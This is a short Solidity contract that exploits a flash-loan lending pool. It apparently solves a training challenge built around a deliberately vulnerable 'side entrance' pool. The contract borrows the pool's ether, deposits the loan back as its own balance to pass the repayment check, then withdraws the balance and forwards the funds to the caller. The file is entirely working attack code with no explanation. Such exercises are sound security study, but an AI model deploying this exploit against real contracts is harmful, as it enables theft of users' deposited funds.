// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";


interface ISideEntranceLenderPool {
 
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}
 
contract SideEntranceAbuser
{
    using Address for address payable;

    ISideEntranceLenderPool public lender;
    function execute() external payable
    {
        lender.deposit{value: msg.value}();
    }

    function attack(address _lender, uint256 amount) external
    {
        lender = ISideEntranceLenderPool(_lender);
        lender.flashLoan(amount);
        lender.withdraw();
        
        payable(msg.sender).sendValue(amount);
    }

    receive() external payable
    {
    }
}